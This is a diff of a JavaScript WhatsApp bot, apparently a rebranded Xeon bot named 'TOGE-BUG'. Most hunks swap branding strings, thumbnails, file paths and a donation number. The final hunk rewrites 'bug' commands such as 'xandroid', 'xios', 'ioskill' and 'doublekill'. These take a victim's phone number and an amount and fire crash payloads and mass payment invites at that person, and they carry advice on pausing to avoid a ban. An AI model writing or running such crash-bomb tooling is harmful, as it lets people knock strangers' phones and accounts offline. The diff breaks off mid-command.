@@ -467,7 +467,7 @@ const subscribe_dgxeon = {
 },
 message: {
 "listResponseMessage": {
-title: `Xeon's ur father`
+title: `toge's ur father`
 }}
 }
 async function XeonyCrashy(dgxeon,chat) {
@@ -524,7 +524,7 @@ await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
         }
         
         if (autobio) {
-            XeonBotInc.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
+            XeonBotInc.updateProfileStatus(`𝚃𝙾𝙶𝙴-𝙱𝚄𝙶-𝚅𝟸 𝙾𝙽𝙻𝙸𝙽𝙴 𝙱𝚈 ${ownername}`).catch(_ => _)
         }
         if (m.sender.startsWith('92') && global.anti92 === true) {
             return XeonBotInc.updateBlockStatus(m.sender, 'block')
@@ -1202,17 +1202,17 @@ senddocu(buffer)
                 neww = performance.now()
                 oldd = performance.now()
                 respon = `
-Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
+*_Response Speed_* ${latensi.toFixed(4)} *_Second_* \n ${oldd - neww} *_miliseconds_*\n\n*_Runtime :_* ${runtime(process.uptime())}
 
-💻 Info Server
-RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
+💨 *_Info Server.._*
+*RAM:* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
 
-_NodeJS Memory Usaage_
+*NodeJS Memory Usaage*
 ${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
 
-${cpus[0] ? `_Total CPU Usage_
+${cpus[0] ? `*Total CPU Usage*
 ${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
-_CPU Core(s) Usage (${cpus.length} Core CPU)_
+*CPU Core(s) Usage (${cpus.length} Core CPU)*
 ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
 `.trim()
                 await XeonBotInc.sendMessage(m.chat, {
@@ -1222,7 +1222,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `${latensi.toFixed(4)} Second`,
-                            thumbnailUrl: 'https://telegra.ph/file/97c008170fe8e6e714a32.jpg',
+                            thumbnailUrl: 'https://telegra.ph/file/30aecda289660bc1bcd46.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1244,7 +1244,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `${ownername}`,
-                            thumbnailUrl: 'https://telegra.ph/file/97c008170fe8e6e714a32.jpg',
+                            thumbnailUrl: 'https://telegra.ph/file/30aecda289660bc1bcd46.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1256,7 +1256,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             }
             break
             case 'runtime':
-                let runtimetext = `Bots Have Been Running For ${runtime(process.uptime())}`
+                let runtimetext = `𝚃𝙾𝙶𝙴-𝙱𝚄𝙶-𝚅𝟸 𝙷𝙰𝚅𝙴𝚂 𝙱𝙴𝙴𝙽 𝚁𝚄𝙽𝙽𝙸𝙽𝙶 𝙵𝙾𝚁 ${runtime(process.uptime())}`
                 XeonBotInc.sendMessage(m.chat, {
                     text: runtimetext,
                     contextInfo: {
@@ -1278,13 +1278,13 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'script':
             case 'scriptbot':
                 XeonBotInc.sendMessage(m.chat, {
-                    text: `Helllo world`,
+                    text: `*TOGE-MD-V3 :* https://github.com/toge012345/TOGE-V3-AI\n\n*TOGE-MD-V2 :* https://github.com/toge012345/TOGE-MD-V2\n\n*BUG BOT :* https://github.com/toge012345/TOGE-BUG-AI`,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `SCRIPT OF ${botname}`,
-                            thumbnailUrl: 'https://telegra.ph/file/97c008170fe8e6e714a32.jpg',
+                            thumbnailUrl: 'https://telegra.ph/file/8eba7948b13178627ca20.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1298,7 +1298,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'donasi':
                 let textnate = `Hello Brother ${pushname}\n\nNo matter how much you donate is very valuable for us`
                 XeonBotInc.sendMessage(m.chat, {
-                    text: 'Paypal: https://www.paypal.me/josephxeon13\n\n' + textnate
+                    text: '𝚖𝚊𝚍𝚎 𝚊 𝚍𝚎𝚙𝚘𝚜𝚒𝚝 𝚘𝚗 𝚝𝚑𝚒𝚜 𝚗𝚞𝚖𝚋𝚎𝚛: +24105114159 \n\n' + textnate
                 }, {
                     quoted: m
                 })
@@ -1308,7 +1308,7 @@ const repf = await XeonBotInc.sendMessage(from, {
 contacts: { 
 displayName: `${list.length} Contact`, 
 contacts: list }, mentions: [sender] }, { quoted: m })
-XeonBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
+XeonBotInc.sendMessage(from, { text : `𝚑𝚎𝚕𝚕𝚘 @${sender.split("@")[0]}, 𝚝𝚑𝚒𝚜 𝚒𝚜 𝚖𝚢 𝚘𝚠𝚗𝚎𝚛`, mentions: [sender]}, { quoted: repf })
 }
 break
             case 'sticker':
@@ -1560,7 +1560,7 @@ break
             }
             break
             case 'fliptext': {
-                if (args.length < 1) return replygcxeon(`Example:\n${prefix}fliptext Xeony`)
+                if (args.length < 1) return replygcxeon(`Example:\n${prefix}fliptext toge`)
                 quere = args.join(" ")
                 flipe = quere.split('').reverse().join('')
                 replygcxeon(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
@@ -1609,7 +1609,7 @@ bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
 let ceknye = await XeonBotInc.onWhatsApp(bnnd)
 if (ceknye.length == 0) return replygcxeon(`Enter A Valid And Registered Number On WhatsApp!!!`)
 owner.push(bnnd)
-fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
+fs.writeFileSync('./lib/database/owner.json', JSON.stringify(owner))
 replygcxeon(`Number ${bnnd} Has Become An Owner!!!`)
 break
 case 'delowner':
@@ -1618,7 +1618,7 @@ if (!args[0]) return replygcxeon(`Use ${prefix+command} nomor\nExample ${prefix+
 ya = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = owner.indexOf(ya)
 owner.splice(unp, 1)
-fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
+fs.writeFileSync('./lib/database/owner.json', JSON.stringify(owner))
 replygcxeon(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
 break
             case 'addvideo': {
@@ -1627,8 +1627,8 @@ break
                 if (VideoXeon.includes(q)) return replygcxeon("The name you entered already exists")
                 let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                 VideoXeon.push(q)
-                await fsx.copy(delb, `./TOGEMedia/video/${q}.mp4`)
-                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
+                await fsx.copy(delb, `./lib/Media/video/${q}.mp4`)
+                fs.writeFileSync('./lib/database/auto_reply/video.json', JSON.stringify(VideoXeon))
                 fs.unlinkSync(delb)
                 replygcxeon(`Success Adding Video\To View Type ${prefix}listvideo`)
             }
@@ -1639,8 +1639,8 @@ break
                 if (!VideoXeon.includes(q)) return replygcxeon("Name Does Not Exist in Database")
                 let wanu = VideoXeon.indexOf(q)
                 VideoXeon.splice(wanu, 1)
-                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
-                fs.unlinkSync(`./TOGEMedia/video/${q}.mp4`)
+                fs.writeFileSync('./lib/database/auto_reply/video.json', JSON.stringify(VideoXeon))
+                fs.unlinkSync(`./lib/Media/video/${q}.mp4`)
                 replygcxeon(`Successfully Deleted Video ${q}`)
             }
             break
@@ -1650,8 +1650,8 @@ break
                 if (ImageXeon.includes(q)) return replygcxeon("The name you entered is already registered in the database")
                 let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                 ImageXeon.push(q)
-                await fsx.copy(delb, `./TOGEMedia/image/${q}.jpg`)
-                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
+                await fsx.copy(delb, `./lib/Media/image/${q}.jpg`)
+                fs.writeFileSync('./lib/database/auto_reply/image.json', JSON.stringify(ImageXeon))
                 fs.unlinkSync(delb)
                 replygcxeon(`Success In Adding Image\nTo Check Type ${prefix}listimage`)
             }
@@ -1662,8 +1662,8 @@ break
                 if (!ImageXeon.includes(q)) return replygcxeon("The image name you entered is not registered")
                 let wanu = ImageXeon.indexOf(q)
                 ImageXeon.splice(wanu, 1)
-                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
-                fs.unlinkSync(`./TOGEMedia/image/${q}.jpg`)
+                fs.writeFileSync('./lib/database/autoreply/image.json', JSON.stringify(ImageXeon))
+                fs.unlinkSync(`./lib/Media/image/${q}.jpg`)
                 replygcxeon(`Successfully Deleted Image ${q}`)
             }
             break
@@ -1673,8 +1673,8 @@ break
                 if (StickerXeon.includes(q)) return replygcxeon("Name Already In Use")
                 let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                 StickerXeon.push(q)
-                await fsx.copy(delb, `./TOGEMedia/sticker/${q}.webp`)
-                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
+                await fsx.copy(delb, `./lib/Media/sticker/${q}.webp`)
+                fs.writeFileSync('./lib/database/auto_reply/sticker.json', JSON.stringify(StickerXeon))
                 fs.unlinkSync(delb)
                 replygcxeon(`Successfully Adding Sticker\To Check Type ${prefix}liststicker`)
             }
@@ -1685,8 +1685,8 @@ break
                 if (!StickerXeon.includes(q)) return replygcxeon("Name Not Registered in Database")
                 let wanu = StickerXeon.indexOf(q)
                 StickerXeonBotInc.splice(wanu, 1)
-                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
-                fs.unlinkSync(`./TOGEMedia/sticker/${q}.webp`)
+                fs.writeFileSync('./lib/database/auto_reply/sticker.json', JSON.stringify(StickerXeon))
+                fs.unlinkSync(`./lib/Media/sticker/${q}.webp`)
                 replygcxeon(`Successfully Removed Sticker ${q}`)
             }
             break
@@ -1696,8 +1696,8 @@ break
                 if (VoiceNoteXeon.includes(q)) return replygcxeon("Name Already In Use")
                 let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                 VoiceNoteXeon.push(q)
-                await fsx.copy(delb, `./TOGEMedia/audio/${q}.mp3`)
-                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
+                await fsx.copy(delb, `./lib/Media/audio/${q}.mp3`)
+                fs.writeFileSync('./lib/database/auto_reply/vn.json', JSON.stringify(VoiceNoteXeon))
                 fs.unlinkSync(delb)
                 replygcxeon(`Success Adding Audio\nTo Check Type ${prefix}listvn`)
             }
@@ -1708,8 +1708,8 @@ break
                 if (!VoiceNoteXeon.includes(q)) return replygcxeon("Name Not Registered in Database")
                 let wanu = VoiceNoteXeon.indexOf(q)
                 VoiceNoteXeon.splice(wanu, 1)
-                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
-                fs.unlinkSync(`./TOGEMedia/audio/${q}.mp3`)
+                fs.writeFileSync('./lib/database/auto_reply/vn.json', JSON.stringify(VoiceNoteXeon))
+                fs.unlinkSync(`./lib/Media/audio/${q}.mp3`)
                 replygcxeon(`Successfully Deleted Audio ${q}`)
             }
             break
@@ -1722,8 +1722,8 @@ let teks = `${text}`
 if (ZipXeon.includes(teks)) return replygcxeon("This name is already in use")
 let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
 ZipXeon.push(teks)
-await fsx.copy(delb, `./TOGEMedia/zip/${teks}.zip`)
-fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
+await fsx.copy(delb, `./lib/Media/zip/${teks}.zip`)
+fs.writeFileSync('./lib/database/auto_reply/zip.json', JSON.stringify(ZipXeon))
 fs.unlinkSync(delb)
 replygcxeon(`Success Adding zip\nTo check type ${prefix}listzip`)
 }
@@ -1738,8 +1738,8 @@ let teks = `${text}`
 if (!ZipXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
 let wanu = ZipXeon.indexOf(teks)
 ZipXeon.splice(wanu, 1)
-fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
-fs.unlinkSync(`./TOGEMedia/zip/${teks}.zip`)
+fs.writeFileSync('./lib/database/auto_reply/zip.json', JSON.stringify(ZipXeon))
+fs.unlinkSync(`./lib/Media/zip/${teks}.zip`)
 replygcxeon(`Successfully deleted zip ${teks}`)
 }
 }
@@ -1763,8 +1763,8 @@ let teks = `${text}`
 if (ApkXeon.includes(teks)) return replygcxeon("This name is already in use")
 let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
 apknye.push(teks)
-await fsx.copy(delb, `./TOGEMedia/apk/${teks}.apk`)
-fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
+await fsx.copy(delb, `./lib/Media/apk/${teks}.apk`)
+fs.writeFileSync('./lib/database/auto_reply/apk.json', JSON.stringify(ApkXeon))
 fs.unlinkSync(delb)
 replygcxeon(`Successful Adding apk\nTo Check type ${prefix}listapk`)
 }
@@ -1779,8 +1779,8 @@ let teks = `${text}`
 if (!ApkXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
 let wanu = ApkXeon.indexOf(teks)
 ApkXeon.splice(wanu, 1)
-fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
-fs.unlinkSync(`./TOGEMedia/apk/${teks}.apk`)
+fs.writeFileSync('./lib/database/auto_reply/apk.json', JSON.stringify(ApkXeon))
+fs.unlinkSync(`./lib/Media/apk/${teks}.apk`)
 replygcxeon(`Successfully deleted Apk ${teks}`)
 }
 }
@@ -1804,8 +1804,8 @@ let teks = `${text}`
 if (DocXeon.includes(teks)) return replygcxeon("This name is already in use")
 let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
 docunye.push(teks)
-await fsx.copy(delb, `./XeonMedia/doc/${teks}.pdf`)
-fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
+await fsx.copy(delb, `./lib/Media/doc/${teks}.pdf`)
+fs.writeFileSync('./lib/database/autoreply/doc.json', JSON.stringify(DocXeon))
 fs.unlinkSync(delb)
 replygcxeon(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
 }
@@ -1820,8 +1820,8 @@ let teks = `${text}`
 if (!DocXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
 let wanu = DocApk.indexOf(teks)
 docunye.splice(wanu, 1)
-fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
-fs.unlinkSync(`./TOGEMedia/doc/${teks}.pdf`)
+fs.writeFileSync('./lib/database/autoreply/doc.json', JSON.stringify(DocXeon))
+fs.unlinkSync(`./lib/Media/doc/${teks}.pdf`)
 replygcxeon(`Successfully deleted pdf ${teks}`)
 }
 }
@@ -2068,176 +2068,16 @@ await XeonBotInc.sendMessage(m.chat, { audio: XeonBotInc_dev, mimetype: 'audio/m
 break
 
 //bug cases
-case "xandroid": {
+case "xandroid": case "bugv1": case "bugv2": case "bugv3": case "bugv4": case "bugv5": {
   if (!isPremium) return replygcxeon(mess.prem)
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 241xxxxxxxxxx,5`) 
+  if (!text) return replygcxeon(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 241xxxxxxxxxx,5`) 
+    return replygcxeon(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
-    return replygcxeon("Amount must be a number");
-  }
-  let cleanedNumber = number.replace(/[^0-9]/g, '');
-  let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
-  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "2349066528353") {
-    return;
-  }
-  if (contactInfo.length == 0) {
-    return replygcxeon("The number is not registered on WhatsApp");
-  }
-  replygcxeon("please wait, " + command + " bug is in process..");
-  await sleep(2000); // Adjusted sleep time for clarity
-  sendVariousMessages(whatsappNumber, encodedAmount);
-  await sleep(2500); // Adjusted sleep time for clarity
-  sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
-    [whatsappNumber]
-  );
-}
-break;
-case "xios": {
-  if (!isPremium) return replygcxeon(mess.prem)
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 241xxxxxxxxxx,5`) 
-  let number = text.split(',')[0];
-  let amount = text.split(',')[1] * 5;
-  if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 241xxxxxxxxxx,5`) 
-  }
-  if (isNaN(parseInt(amount))) {
-    return replygcxeon("Amount must be a number");
-  }
-  let cleanedNumber = number.replace(/[^0-9]/g, '');
-  let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
-  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "2349066528353") {
-    return;
-  }
-  if (contactInfo.length == 0) {
-    return replygcxeon("The number is not registered on WhatsApp");
-  }
-  replygcxeon("please wait, " + command + " bug is in process..");
-  await sleep(2000); // Adjusted sleep time for clarity
-  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
-  await sleep(2500); // Adjusted sleep time for clarity
-  sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
-    [whatsappNumber]
-  );
-}
-break;
-case "xios2":
-  {
-	if (!isPremium) return replygcxeon(mess.prem)
-    if (!isBot) {
-      return replygcxeon("*This feature is for the bot only!*");
-    }
-    if (!text){
-      return replygcxeon(`Example usage: ${prefix + command} 5`)
-      }
-    if (isNaN(parseInt(text))) {
-      return replygcxeon("Amount must be a number");
-    }
-    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
-    replygcxeon("please wait, " + command + " bug is in process..");
-    await sleep(1500); // Adjusted sleep time for clarity
-    sendMultiplePaymentInvites(from, encodedValue);
-    await sleep(2500); // Adjusted sleep time for clarity
-    sendReaction('✅');
-  }
-  break;
-  case "xandroid2":
-  {
-	if (!isPremium) return replygcxeon(mess.prem)
-    if (!isBot) {
-      return replygcxeon("*This feature is for the bot only!*");
-    }
-    if (!text){
-      return replygcxeon(`Example usage: ${prefix + command} 5`)
-      }
-    if (isNaN(parseInt(text))) {
-      return replygcxeon("Amount must be a number");
-    }
-    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
-    replygcxeon("please wait, " + command + " bug is in process..");
-    await sleep(1500); // Adjusted sleep time for clarity
-    sendVariousMessages(from, encodedValue);
-    await sleep(2500); // Adjusted sleep time for clarity
-    sendReaction('✅');
-  }
-  break;
-  case "xgc":
-  {
-    if (!isPremium) return replygcxeon(mess.prem)
-    if (!text) {
-      return replygcxeon("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
-    }
-    replygcxeon("please wait, " + command + " bug is in process..");
-    if (!text.split(" ")[0].includes("whatsapp.com")) {
-      return replygcxeon("Link Invalid!");
-    }
-    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
-    try {
-      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
-      let groupTarget = await XeonBotInc.groupAcceptInvite(groupLink);
-      await sleep(2000); // Adjusted sleep time for clarity
-      sendViewOnceMessages(groupTarget, bugAmount);
-      await sleep(2500); // Adjusted sleep time for clarity
-      replygcxeon("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
-      XeonBotInc.groupLeave(groupTarget);
-    } catch (error) {
-      replygcxeon(util.format(error));
-    }
-  }
-  break;
-  case "systemuicrash": {
-  if (!isPremium) return replygcxeon(mess.prem)
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 241xxxxxxxxxx,5`) 
-  let number = text.split(',')[0];
-  let amount = text.split(',')[1] * 5;
-  if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 241xxxxxxxxx,5`) 
-  }
-  if (isNaN(parseInt(amount))) {
-    return replygcxeon("Amount must be a number");
-  }
-  let cleanedNumber = number.replace(/[^0-9]/g, '');
-  let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
-  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "2349066528353") {
-    return;
-  }
-  if (contactInfo.length == 0) {
-    return replygcxeon("The number is not registered on WhatsApp");
-  }
-  replygcxeon("please wait, " + command + " bug is in process..");
-  await sleep(2000); // Adjusted sleep time for clarity
-  sendMixedMessages(whatsappNumber, encodedAmount);
-  await sleep(2500); // Adjusted sleep time for clarity
-  sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
-    [whatsappNumber]
-  );
-}
-break;
-case "xsysui": {
-  if (!isPremium) return replygcxeon(mess.prem)
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 241xxxxxxxxxx,5`) 
-  let number = text.split(',')[0];
-  let amount = text.split(',')[1] * 5;
-  if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 241xxxxxxxxxx,5`) 
-  }
-  if (isNaN(parseInt(amount))) {
-    return replygcxeon("Amount must be a number");
+    return replygcxeon("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
   }
   let cleanedNumber = number.replace(/[^0-9]/g, '');
   let encodedAmount = '' + encodeURI(amount);
@@ -2247,15 +2087,175 @@ case "xsysui": {
     return;
   }
   if (contactInfo.length == 0) {
-    return replygcxeon("The number is not registered on WhatsApp");
+    return replygcxeon("𝐓𝐡𝐞 𝐧𝐮𝐦𝐛𝐞𝐫 𝐢𝐬 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝 𝐨𝐧 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩");
   }
-  replygcxeon("please wait, " + command + " bug is in process..");
+  replygcxeon("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙, " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘...");
+  await sleep(2000); // Adjusted sleep time for clarity
+  sendVariousMessages(whatsappNumber, encodedAmount);
+  await sleep(2500); // Adjusted sleep time for clarity
+  sendMessageWithMentions(
+    "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
+    " 𝖀𝖘𝖎𝖓𝖌 *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
+    [whatsappNumber]
+  );
+}
+break;
+case "xios": {
+  if (!isPremium) return replygcxeon(mess.prem)
+  if (!text) return replygcxeon(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+  let number = text.split(',')[0];
+  let amount = text.split(',')[1] * 5;
+  if (!number || !amount) {
+    return replygcxeon(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+  }
+  if (isNaN(parseInt(amount))) {
+    return replygcxeon("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
+  }
+  let cleanedNumber = number.replace(/[^0-9]/g, '');
+  let encodedAmount = '' + encodeURI(amount);
+  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "24102150169") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return replygcxeon("𝐓𝐡𝐞 𝐧𝐮𝐦𝐛𝐞𝐫 𝐢𝐬 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝 𝐨𝐧 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩");
+  }
+  replygcxeon("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙, " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘...");
+  await sleep(2000); // Adjusted sleep time for clarity
+  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
+  await sleep(2500); // Adjusted sleep time for clarity
+  sendMessageWithMentions(
+    "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
+    " 𝖀𝖘𝖎𝖓𝖌 *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
+    [whatsappNumber]
+  );
+}
+break;
+case "xios2": case "ioskill": case "iosx":
+  {
+	if (!isPremium) return replygcxeon(mess.prem)
+    if (!isBot) {
+      return replygcxeon("𝕿𝖍𝖎𝖘 𝖋𝖊𝖆𝖙𝖚𝖗𝖊 𝖎𝖘 𝖋𝖔𝖗 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖔𝖓𝖑𝖞!");
+    }
+    if (!text){
+      return replygcxeon(`𝕰𝖝𝖆𝖒𝖕𝖑𝖊 𝖚𝖘𝖆𝖌𝖊: ${prefix + command} 5`)
+      }
+    if (isNaN(parseInt(text))) {
+      return replygcxeon("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
+    }
+    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
+    replygcxeon("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙, " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘...");
+    await sleep(1500); // Adjusted sleep time for clarity
+    sendMultiplePaymentInvites(from, encodedValue);
+    await sleep(2500); // Adjusted sleep time for clarity
+    sendReaction('✅');
+  }
+  break;
+  case "xandroid2": case "onekill": case "oneclickall": case "xsamsung": case "xwaweb": case "doublekill": case "triplekill":
+  {
